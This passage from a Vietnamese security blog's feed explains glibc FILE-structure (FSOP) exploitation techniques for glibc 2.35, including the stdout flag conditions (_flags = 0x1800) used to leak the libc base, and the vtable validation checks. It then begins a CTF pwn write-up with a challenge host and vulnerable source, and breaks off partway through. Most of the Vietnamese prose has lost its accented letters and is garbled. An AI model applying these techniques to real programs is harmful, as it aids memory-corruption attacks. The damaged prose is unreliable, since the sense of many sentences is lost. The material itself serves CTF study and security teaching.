</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _OLD_STDIO_MAGIC 0xFABC0000 </span><span style="color:#75715e">/* Emulate old stdio. */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_MAGIC_MASK 0xFFFF0000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_USER_BUF 1 </span><span style="color:#75715e">/* User owns buffer; don&#39;t delete it on close. */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_UNBUFFERED 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_NO_READS 4 </span><span style="color:#75715e">/* Reading not allowed */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_NO_WRITES 8 </span><span style="color:#75715e">/* Writing not allowd */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_EOF_SEEN 0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_ERR_SEEN 0x20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_DELETE_DONT_CLOSE 0x40 </span><span style="color:#75715e">/* Don&#39;t call close(_fileno) on cleanup. */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_LINKED 0x80 </span><span style="color:#75715e">/* Set if linked (using _chain) to streambuf::_list_all.*/</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_IN_BACKUP 0x100
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_LINE_BUF 0x200
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_TIED_PUT_GET 0x400 </span><span style="color:#75715e">/* Set if put and get pointer logicly tied. */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_CURRENTLY_PUTTING 0x800
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_IS_APPENDING 0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_IS_FILEBUF 0x2000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_BAD_SEEN 0x4000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_USER_LOCK 0x8000
</span></span></span></code></pre></div><p>Ln lt c source v i qua tng hm  xem c th khai thc c g khng:</p>
<p> thc hin c <code>_IO_do_write()</code> th mnh ln lt check tng cu lnh if trong <code>_IO_new_file_overflow()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_NO_WRITES) <span style="color:#75715e">/* SET ERROR */</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">|=</span> _IO_ERR_SEEN;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__set_errno</span> (EBADF);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> EOF;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>R rng <code>f-&gt;_flags &amp; _IO_NO_WRITES</code> buc phi tr v false th mi thc hin tip c.</p>
<pre tabindex="0"><code>   0x7ffff7c86e64 &lt;_IO_file_overflow+4&gt;     push   r12
   0x7ffff7c86e66 &lt;_IO_file_overflow+6&gt;     push   rbp
   0x7ffff7c86e67 &lt;_IO_file_overflow+7&gt;     push   rbx
   0x7ffff7c86e68 &lt;_IO_file_overflow+8&gt;     mov    eax, dword ptr [rdi]
   0x7ffff7c86e6a &lt;_IO_file_overflow+10&gt;    mov    rbx, rdi
  0x7ffff7c86e6d &lt;_IO_file_overflow+13&gt;    test   al, 8
</code></pre><p><code>_IO_NO_WRITES = 8</code>  nn <code>stdout-&gt;_flags &amp; 8 = 0</code></p>
<ul>
<li><code>stdout-&gt;_flags &amp; 8 = 0</code></li>
</ul>
<p>Tip tc check tip, chng ta phi khin n sao cho tr v False</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_CURRENTLY_PUTTING) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Allocate a buffer if needed. */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">_IO_doallocbuf</span> (f);
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">_IO_setg</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_buf_base, f<span style="color:#f92672">-&gt;</span>_IO_buf_base, f<span style="color:#f92672">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></div><p>C ngha <code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code></p>
<p>Kim tra gi tr <code>_IO_CURRENTLY_PUTTING</code> trong gdb:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c86e75</span> <span style="color:#f92672">&lt;</span>_IO_file_overflow<span style="color:#f92672">+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>    mov    ebp, esi
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c86e77</span> <span style="color:#f92672">&lt;</span>_IO_file_overflow<span style="color:#f92672">+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>    mov    rsi, qword ptr [rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x7ffff7c86e7b</span> <span style="color:#f92672">&lt;</span>_IO_file_overflow<span style="color:#f92672">+</span><span style="color:#ae81ff">27</span><span style="color:#f92672">&gt;</span>    test   ah, <span style="color:#ae81ff">8</span>
</span></span></code></pre></div><p>Nh vy <code>f-&gt;_flags &amp; 8 = 1</code> || <code>f-&gt;_IO_write_base == NULL</code> -&gt; False</p>
<ul>
<li><code>f-&gt;_flags &amp; 0x0800 = 1</code></li>
</ul>
<p>Gi s, chng ta  bypass qua 2 ln check 
Ta  lu  <code>ch</code> vn bng EOF nn c th thnh cng vo hm <code>_IO_do_write()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ch <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_IO_do_write</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_write_base,
</span></span><span style="display:flex;"><span>			 f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base);
</span></span></code></pre></div><p><code>_IO_do_write()</code> gi ti <code>_IO_new_do_write</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">size_t</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_do_write</span> (FILE <span style="color:#f92672">*</span>fp, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">size_t</span> to_do)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> count;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_IS_APPENDING)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* On a system without a proper O_APPEND implementation,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       you would need to sys_seek(0, SEEK_END) here, but is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       not needed nor desirable for Unix- or Posix-like systems.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       Instead, just indicate that offset (before and after) is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       unpredictable. */</span>
</span></span><span style="display:flex;"><span>    fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">=</span> _IO_pos_BAD;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">!=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">off64_t</span> new_pos
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_SYSSEEK</span> (fp, fp<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">-</span> fp<span style="color:#f92672">-&gt;</span>_IO_read_end, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (new_pos <span style="color:#f92672">==</span> _IO_pos_BAD)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">=</span> new_pos;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  count <span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_SYSWRITE</span> (fp, data, to_do);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">&amp;&amp;</span> count)
</span></span><span style="display:flex;"><span>    fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_adjust_column</span> (fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, data, count) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_IO_setg</span> (fp, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>  fp<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base;
</span></span><span style="display:flex;"><span>  fp<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">=</span> (fp<span style="color:#f92672">-&gt;</span>_mode <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>		       <span style="color:#f92672">&amp;&amp;</span> (fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> (_IO_LINE_BUF <span style="color:#f92672">|</span> _IO_UNBUFFERED))
</span></span><span style="display:flex;"><span>		       <span style="color:#f92672">?</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base : fp<span style="color:#f92672">-&gt;</span>_IO_buf_end);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> count;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>fp-&gt;_flags &amp; _IO_IS_APPENDING</code> cn phi tr v True  khng b vng vo cu lnh if hn n ngay di n :&gt;</p>
<p>Nu khng tha mn iu kin ny th ta th i vo cu lnh nhnh if pha di:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">!=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">off64_t</span> new_pos
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_SYSSEEK</span> (fp, fp<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">-</span> fp<span style="color:#f92672">-&gt;</span>_IO_read_end, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (new_pos <span style="color:#f92672">==</span> _IO_pos_BAD)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">=</span> new_pos;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>So snh gi tr <code>fp-&gt;_IO_read_end</code> v <code>fp-&gt;_IO_write_base</code> nu khc nhau, s gi hm <code>_IO_SYSSEEK()</code>. Bi v gi tr ca <code>fp-&gt;_IO_read_end</code> v <code>fp-&gt;_IO_write_base</code> ang bng nhau nn c th d dng bypass c kin check. I su vo bn trong, <code>_IO_SYSSEEK()</code> s gi syscall <code>lseek()</code> vi tham s l <code>offset=fp-&gt;_IO_write_base - fp-&gt;_IO_read_end</code>. V vy, nu <code>fp-&gt;_IO_write_base</code> &lt; <code>fp-&gt;_IO_read_end</code> th <code>offset</code> s c gi tr m v lm cho chng trnh bo li. Nh vy,  n khng xy ra th ta ch cn overwrite LSB ca <code>fp-&gt;_IO_write_base</code> thnh null byte, nhng mun chc th ta cng overwrite LSB ca<code>fp-&gt;_IO_write_base</code> thnh null.</p>
<p><code>fp-&gt;_flags &amp; _IO_IS_APPENDING = 1</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c8699d</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>    mov    rbp, rdx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c869a0</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>    push   rbx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c869a1</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>    mov    rbx, rdi
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c869a4</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">52</span><span style="color:#f92672">&gt;</span>    sub    rsp, <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c869a8</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">56</span><span style="color:#f92672">&gt;</span>    mov    r14, qword ptr [rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd8</span>]
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x7ffff7c869af</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">63</span><span style="color:#f92672">&gt;</span>    test   dword ptr [rdi], <span style="color:#ae81ff">0x1000</span>       <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c869b5</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>    jne    _IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">272</span>                <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">272</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p><code>_IO_IS_APPENDING = 0x1000</code></p>
<ul>
<li><code>fp-&gt;_flags &amp; 0x1000 == 1</code></li>
</ul>
<p>Vy, tng kt nh sau:</p>
<pre tabindex="0"><code>stdout-&gt;_flags &amp; _IO_NO_WRITES         == 0
stdout-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 1
stdout-&gt;_flags &amp; _IO_IS_APPENDING      == 1
</code></pre><p>_flags &amp; 0x8 = 0
_flags &amp; 0x800 = 1
_flags &amp; 0x1000 = 1
<strong>-&gt; _flags = 0x1800</strong></p>
<p>Tng t vi READ PRIMITIVE, WRITE PRIMITIVE cng cn 1 s iu kin  chng c th hot ng, ch cn chng ta iu khin c cc gi tr <code>_IO_read_end</code>, <code>_IO_read_ptr</code>,&hellip; l c.
Vy, chng ta  thnh cng bypass c tt c cc hn ch v ch cn ghi vo <code>f-&gt;_IO_write_ptr</code> , <code>f-&gt;_IO_write_base</code> nhng gi tr ph hp  khai thc, ta s c c <del>LIBC BASE</del> , khi  c <del>LIBC BASE</del>, ta c th tip tc dng <code>FSOP</code>  iu khin c lung thc thi nh <code>VTABLE HIJACKING</code> nh phn trn mnh  ni (v r rng l  GLIBC-2.35 th gn nh  full , full gip nn vic tn cng FSOP rt l kh v phi cn rt nhiu kin thc v hiu r bn cht  c th i su hn trong k thut ny) !</p>
<h1 id="4-write-primitive">4. Write Primitive</h1>
<h1 id="5-vtable-hijacking">5. Vtable Hijacking</h1>
<p>Ta  thnh cng gii quyt c vn  READ/WRITE PRIMITIVE trn GLIBC-2.35, lm sao ta c th iu khin c lung thc thi t chng trnh nu nh khng th bypass c lot check trn.</p>
<h1 id="6-protection-mechanism">6. Protection Mechanism</h1>
<p>T phin bn <code>Glibc-2.24</code> tr i, khi ta ghi  vo vtable th s khng cn chim quyn iu khin c na. Bi v chng trnh s kim tra tnh hp l ca a ch <code>vtable</code> trc khi gi hm o.</p>
<p>Hai hm <code>IO_validate_vtable</code> and <code>_IO_vtable_check</code> c thm vo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> _IO_jump_t <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">IO_validate_vtable</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> _IO_jump_t <span style="color:#f92672">*</span>vtable)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Fast path: The vtable pointer is within the __libc_IO_vtables
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     section.  */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uintptr_t</span> section_length <span style="color:#f92672">=</span> __stop___libc_IO_vtables <span style="color:#f92672">-</span> __start___libc_IO_vtables;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ptr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) vtable;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uintptr_t</span> offset <span style="color:#f92672">=</span> ptr <span style="color:#f92672">-</span> __start___libc_IO_vtables;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">__glibc_unlikely</span> (offset <span style="color:#f92672">&gt;=</span> section_length))
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* The vtable pointer is not in the expected section.  Use the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       slow path, which will terminate the process if necessary.  */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_IO_vtable_check</span> ();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> vtable;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Hm kim tra xem con tr vtable c nm trong phn <code>__libc_IO_vtables</code> hay khng. Nu khng, n s tip tc gi n <code>_IO_vtable_check</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> attribute_hidden
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_IO_vtable_check</span> (<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SHARED
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>flag) (<span style="color:#66d9ef">void</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">atomic_load_relaxed</span> (<span style="color:#f92672">&amp;</span>IO_accept_foreign_vtables);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef PTR_DEMANGLE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">PTR_DEMANGLE</span> (flag);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (flag <span style="color:#f92672">==</span> <span style="color:#f92672">&amp;</span>_IO_vtable_check)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    Dl_info di;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> link_map <span style="color:#f92672">*</span>l;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (_dl_open_hook <span style="color:#f92672">!=</span> NULL
</span></span><span style="display:flex;"><span>       <span style="color:#f92672">||</span> (<span style="color:#a6e22e">_dl_addr</span> (_IO_vtable_check, <span style="color:#f92672">&amp;</span>di, <span style="color:#f92672">&amp;</span>l, NULL) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&amp;&amp;</span> l<span style="color:#f92672">-&gt;</span>l_ns <span style="color:#f92672">!=</span> LM_ID_BASE))
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#else </span><span style="color:#75715e">/* !SHARED */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (__dlopen <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__libc_fatal</span> (<span style="color:#e6db74">&#34;Fatal error: glibc detected an invalid stdio handle</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nu <code>vtable</code> khng hp l, chng trnh s dng li v bo li.</p>
<h1 id="references">References</h1>
<p><a href="https://chovid99.github.io/posts/file-structure-attack-part-1/">https://chovid99.github.io/posts/file-structure-attack-part-1/</a></p>
<p><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a></p>
<p><a href="https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/">https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/</a></p>
<p><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</a></p>
<p><a href="https://en.wikipedia.org/wiki/Virtual_method_table">https://en.wikipedia.org/wiki/Virtual_method_table</a></p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/">https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/</a></p>
<p><a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/">https://blog.kylebot.net/2022/10/22/angry-FSROP/</a></p>
<p><a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>W1 Test</title>
      <link>https://w1n-gl0ry.github.io/posts/training/</link>
      <pubDate>Tue, 01 Aug 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/training/</guid>
      <description><![CDATA[<h1 id="overview">Overview</h1>
<p>Tun va ri mnh c tham gia gii mini-CTF v 3 mng (web, forensics, crypto) ca CLB W1. Tun ny quay tr li bi test v binary (gm Pwn v Reverse), bi test gm 2 bi Pwn v 5 bi Reverse, mnh  hon thnh 6/7 bi. Mnh xin trnh by mt s bi m mnh  lm c</p>
<h1 id="pwn">PWN</h1>
<h2 id="vector_calc">Vector_Calc</h2>
<p><code>Host: nc 45.122.249.68 20017</code></p>
<p><code>Description: My vector calculator is complete. However, I feel something is not right about this program. Can you find it?</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/chall">bin</a>, <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/src/chall.c">src</a></p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/src/chall.c">chall.c</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_FAVES 4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_VECTORS 3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> Vector{
</span></span><span style="display:flex;"><span>__uint64_t x;
</span></span><span style="display:flex;"><span>__uint64_t y;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>printFunc)(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Vector v_list[MAX_VECTORS];
</span></span><span style="display:flex;"><span>__uint64_t<span style="color:#f92672">*</span> sum;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> faves[MAX_FAVES];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printData</span>(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span> v);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">enterData</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span> v;
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
